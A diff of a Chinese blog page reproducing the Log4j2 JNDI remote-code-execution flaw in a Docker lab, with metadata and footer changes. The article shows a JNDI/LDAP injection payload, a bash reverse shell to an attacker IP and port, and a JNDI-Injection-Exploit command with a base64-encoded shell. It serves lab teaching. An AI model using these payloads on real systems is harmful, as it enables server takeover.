@@ -18,22 +18,22 @@
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="一、漏洞简介Apache Log4j2是一个基于java的日志记录工具，当前被广泛应用于业务系统开发，开发者可以利用该工具将程序的输入输出信息进行日志记录。 2021年11月24日，阿里云安全团队向Apache官方报告了Apache Log4j2远程代码执行漏洞。该漏洞是由于Apache Log4j2某些功能存在递归解析功能，导致攻击者可直接构造恶意请求，触发远程代码执行漏洞，从而获得目标服务器权">
+        <meta name="description" content="Apache Log4j2是一个基于java的日志记录工具，当前被广泛应用于业务系统开发，开发者可以利用该工具将程序的输入输出信息进行日志记录。 2021年11月24日，阿里云安全团队向Apache官方报告了Apache Log4j2远程代码执行漏洞。该漏洞是由于Apache Log4j2某些功能存在递归解析功能，导致攻击者可直接构造恶意请求，触发远程代码执行漏洞，从而获得目标服务器权限。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Log4J2-RCE漏洞">
 <meta property="og:url" content="http://blog.pppfz.com/2023/08/16/Log4J2-RCE%E6%BC%8F%E6%B4%9E/index.html">
 <meta property="og:site_name" content="PPPFZ&#39;s Blog">
-<meta property="og:description" content="一、漏洞简介Apache Log4j2是一个基于java的日志记录工具，当前被广泛应用于业务系统开发，开发者可以利用该工具将程序的输入输出信息进行日志记录。 2021年11月24日，阿里云安全团队向Apache官方报告了Apache Log4j2远程代码执行漏洞。该漏洞是由于Apache Log4j2某些功能存在递归解析功能，导致攻击者可直接构造恶意请求，触发远程代码执行漏洞，从而获得目标服务器权">
+<meta property="og:description" content="Apache Log4j2是一个基于java的日志记录工具，当前被广泛应用于业务系统开发，开发者可以利用该工具将程序的输入输出信息进行日志记录。 2021年11月24日，阿里云安全团队向Apache官方报告了Apache Log4j2远程代码执行漏洞。该漏洞是由于Apache Log4j2某些功能存在递归解析功能，导致攻击者可直接构造恶意请求，触发远程代码执行漏洞，从而获得目标服务器权限。">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://blog.pppfz.com/assets/f3e3b01e525c429c844df5e68730eb27">
-<meta property="og:image" content="https://blog.pppfz.com/assets/be85fe38ea8f481da3fa5407b6f63aca">
-<meta property="og:image" content="https://blog.pppfz.com/assets/031680d9447141f79475622a4b3f39fc">
-<meta property="article:published_time" content="2023-08-16T11:30:56.000Z">
-<meta property="article:modified_time" content="2023-08-16T11:40:12.331Z">
+<meta property="og:image" content="https://blog.pppfz.com/assets/0c5aff5fc511dbb9d5697c91e9add598.png">
+<meta property="og:image" content="https://blog.pppfz.com/assets/117350f11a80fb9df3992f43bb78971f.png">
+<meta property="og:image" content="https://blog.pppfz.com/assets/a096ba03a94522ae0444a2d38d5d5051.png">
+<meta property="article:published_time" content="2023-08-16T08:04:43.000Z">
+<meta property="article:modified_time" content="2023-08-16T13:49:33.527Z">
 <meta property="article:author" content="PPPFZ">
-<meta property="article:tag" content="重要漏洞复现">
+<meta property="article:tag" content="漏洞">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://blog.pppfz.com/assets/f3e3b01e525c429c844df5e68730eb27">
+<meta name="twitter:image" content="https://blog.pppfz.com/assets/0c5aff5fc511dbb9d5697c91e9add598.png">
     
     
     <!--- Icon Part-->
@@ -72,7 +72,7 @@
     <script id="hexo-configurations">
     let Global = window.Global || {};
     Global.hexo_config = {"hostname":"blog.pppfz.com","root":"/","language":"zh-CN","path":"search.xml"};
-    Global.theme_config = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"PPPFZ BLOG","subtitle":{"text":["cheer for me !!!"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/pppfz","instagram":null,"zhihu":null,"twitter":null,"email":"pppfz1@outlook.com"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.3.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Status":{"path":"https://status.pppfz.com/","icon":"fa-regular fa-chart-bar"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about/about.html","Github":"https://github.com/pppfz","ChatGPT":"https://gpt.pppfz.com","Friends":"/friends/friends.html"}}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":10},"tags":{"enable":true,"limit":10}},"footerStart":"2022/8/17 11:45:14"};
+    Global.theme_config = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"PPPFZ BLOG","subtitle":{"text":["cheer for me !!!"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/pppfz","instagram":null,"zhihu":null,"twitter":null,"email":"pppfz1@outlook.com"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.3.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Status":{"path":"https://status.pppfz.com/","icon":"fa-regular fa-chart-bar"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about/about.html","Github":"https://github.com/pppfz","ChatGPT":"https://gpt.pppfz.com","Friends":"/friends/friends.html"}}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":10},"tags":{"enable":true,"limit":10}},"footerStart":"2022/8/15 11:45:14"};
     Global.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
     Global.data_config = {"masonry":false};
   </script>
@@ -350,11 +350,7 @@
 
         <div class="article-title">
             
-                
-                
-                <img src="https://blog.pppfz.com/gallery/tuku%20%28%31%29.jpg" alt="Log4J2-RCE漏洞" />
-                
-                <h1 class="article-title-cover">Log4J2-RCE漏洞</h1>
+                <h1 class="article-title-regular">Log4J2-RCE漏洞</h1>
             
             </div>
             
@@ -376,19 +372,35 @@
                         <div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2023-08-16 19:30:56</span>
-        <span class="mobile">2023-08-16 19:30:56</span>
+        <span class="desktop">2023-08-16 16:04:43</span>
+        <span class="mobile">2023-08-16 16:04:43</span>
         <span class="hover-info">创建</span>
     </span>
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2023-08-16 19:40:12</span>
-            <span class="mobile">2023-08-16 19:40:12</span>
+            <span class="desktop">2023-08-16 21:49:33</span>
+            <span class="mobile">2023-08-16 21:49:33</span>
             <span class="hover-info">更新</span>
         </span>
     
 
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E/">漏洞</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
     
     
         <span class="article-tags article-meta-item">
@@ -396,7 +408,7 @@
             <ul>
                 
                     <li>
-                        <a href="/tags/%E9%87%8D%E8%A6%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">重要漏洞复现</a>&nbsp;
+                        <a href="/tags/%E6%BC%8F%E6%B4%9E/">漏洞</a>&nbsp;
                     </li>
                 
             </ul>
@@ -436,7 +448,7 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://blog.pppfz.com/assets/f3e3b01e525c429c844df5e68730eb27"
+                     data-src="https://blog.pppfz.com/assets/0c5aff5fc511dbb9d5697c91e9add598.png"
                       alt="0c5aff5fc511dbb9d5697c91e9add598.png"
                 ></p>
 <p>JNDI可以使用相应目录接口请求普通数据，还可以请求Java（编译型语言）对象。而且JNDl支持以命名引用(Naming References)的方式去远程下载一个class（Java编译后的文件 .class）文件，然后加载该class文件并构建对象。若下载的是攻击者构建的含有恶意代码的class文件，则会在加载时执行恶意代码。</p>
@@ -486,6 +498,7 @@
 <p>(5)启动docker：<code>systemctl start docker</code></p>
 <p>(6)配置Docker的国内镜像：<code>vi /etc/docker/daemon.json</code></p>
 <h3 id="2-使用dockeri部署log4j2漏洞靶场"><a href="#2-使用dockeri部署log4j2漏洞靶场" class="headerlink" title="2.使用dockeri部署log4j2漏洞靶场"></a>2.使用dockeri部署log4j2漏洞靶场</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart docker</span><br><span class="line">docker ps</span><br><span class="line">docker ps -a</span><br><span class="line"></span><br><span class="line">-------------</span><br><span class="line"></span><br><span class="line">PS C:\Users\ppp&gt; docker ps -a</span><br><span class="line">=============================</span><br><span class="line">CONTAINER ID   IMAGE         COMMAND    CREATED          STATUS                      PORTS     NAMES</span><br><span class="line">b39cdddd1dd3   hello-world   &quot;/hello&quot;   13 seconds ago   Exited (0) 12 seconds ago             charming_chandrasekhar</span><br></pre></td></tr></table></figure></div>
+
 <h4 id="（1）拉取log4j2漏洞的靶场镜像"><a href="#（1）拉取log4j2漏洞的靶场镜像" class="headerlink" title="（1）拉取log4j2漏洞的靶场镜像"></a>（1）拉取log4j2漏洞的靶场镜像</h4><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">拉取镜像</span></span><br><span class="line">docker pull vulfocus/log4j2-rce-2021-12-09</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">导入本地镜像</span></span><br><span class="line">docker load -i log4j2-rce-2021-12-09.tar.gz  </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">导入拉取成功</span></span><br><span class="line">PS C:\Users\ppp&gt; docker images</span><br><span class="line">------------------------------</span><br><span class="line">REPOSITORY                       TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">vulfocus/log4j2-rce-2021-12-09   latest    4ba6de62bfd4   19 months ago   569MB</span><br></pre></td></tr></table></figure></div>
 
 <blockquote>
@@ -497,24 +510,26 @@
 <h4 id="（3）开启8080端口，访问web服务"><a href="#（3）开启8080端口，访问web服务" class="headerlink" title="（3）开启8080端口，访问web服务"></a>（3）开启8080端口，访问web服务</h4><p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://blog.pppfz.com/assets/be85fe38ea8f481da3fa5407b6f63aca"
+                     data-src="https://blog.pppfz.com/assets/117350f11a80fb9df3992f43bb78971f.png"
                       alt="117350f11a80fb9df3992f43bb78971f.png"
                 ></p>
 <h3 id="3-使用DNSLog进行测试"><a href="#3-使用DNSLog进行测试" class="headerlink" title="3.使用DNSLog进行测试"></a>3.使用DNSLog进行测试</h3><p>(1)前往<a class="link"   target="_blank" rel="noopener" href="http://www.dnslog.cn,申请子域名进行测试/" >http://www.dnslog.cn,申请子域名进行测试 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://blog.pppfz.com/assets/031680d9447141f79475622a4b3f39fc"
+                     data-src="https://blog.pppfz.com/assets/a096ba03a94522ae0444a2d38d5d5051.png"
                       alt="a096ba03a94522ae0444a2d38d5d5051.png"
                 ></p>
 <p>(2)在web主页面中点击 ???，url地址变为<a class="link"   target="_blank" rel="noopener" href="http://localhost:8080/hello?payloada=111,%E6%9B%B4%E6%94%B9payload%E4%B8%BA$%7Bjndi:ldap:/test.f2l309.dnslog.cn%7D%EF%BC%8C%E5%B9%B6%E5%B0%86payloadi%E8%BF%9B%E8%A1%8Curl%E7%BC%96%E7%A0%81%E3%80%82" >http://localhost:8080/hello?payloada=111,更改payload为${jndi:ldap:/test.f2l309.dnslog.cn}，并将payloadi进行url编码。 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8080/hello?payload=$&#123;jndi:ldap://test.cohgfw.dnslog.cn&#125;</span><br><span class="line"></span><br><span class="line">http://127.0.0.1:8080/hello?payload=%24%7b%6a%6e%64%69%3a%6c%64%61%70%3a%2f%2f%74%65%73%74%2e%63%6f%68%67%66%77%2e%64%6e%73%6c%6f%67%2e%63%6e%7d</span><br></pre></td></tr></table></figure></div>
+
 <p>访问成功后，查看DNSLog的DNS查询记录，出现payload中的字段说明测试成功。</p>
 <h3 id="4-利用JNDI注入反弹shell"><a href="#4-利用JNDI注入反弹shell" class="headerlink" title="4.利用JNDI注入反弹shell"></a>4.利用JNDI注入反弹shell</h3><p>(1)准备反弹shell，并将此命令进行base64编码</p>
 <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/攻击主机IP/端口 0&gt;&amp;1</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.5/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure></div>
 
 <p>(2)使用JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar进行漏洞利用，将上述base64编码结果填入指定位置，指定kali的IP启动服务。</p>
 <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -c &quot;bash -c &#123;echo,base64码后的she11&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A 攻击主机IP</span><br><span class="line"></span><br><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -c &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuNS80NDQ0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A 攻击主机IP(kali)</span><br></pre></td></tr></table></figure></div>
+
 
         </div>
 
@@ -524,10 +539,10 @@
     <ul>
         <li><strong>标题:</strong> Log4J2-RCE漏洞</li>
         <li><strong>作者:</strong> The PPPFZ</li>
-        <li><strong>创建于:</strong> 2023-08-16 19:30:56</li>
+        <li><strong>创建于:</strong> 2023-08-16 16:04:43</li>
         
             <li>
-                <strong>更新于:</strong> 2023-08-16 19:40:12
+                <strong>更新于:</strong> 2023-08-16 21:49:33
             </li>
         
         <li>
@@ -546,7 +561,7 @@
             <ul class="post-tags-box">
                 
                     <li class="tag-item">
-                        <a href="/tags/%E9%87%8D%E8%A6%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">#重要漏洞复现</a>&nbsp;
+                        <a href="/tags/%E6%BC%8F%E6%B4%9E/">#漏洞</a>&nbsp;
                     </li>
                 
             </ul>
@@ -681,9 +696,29 @@
         </div>
         
         
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
         
             <div class="customize-info info-item">你好，欢迎来到我的BLOG</div>
         
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
         
         
         
@@ -872,6 +907,16 @@
 <script src="/js/layouts/lazyload.js"></script>
 
 
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
 
 
 
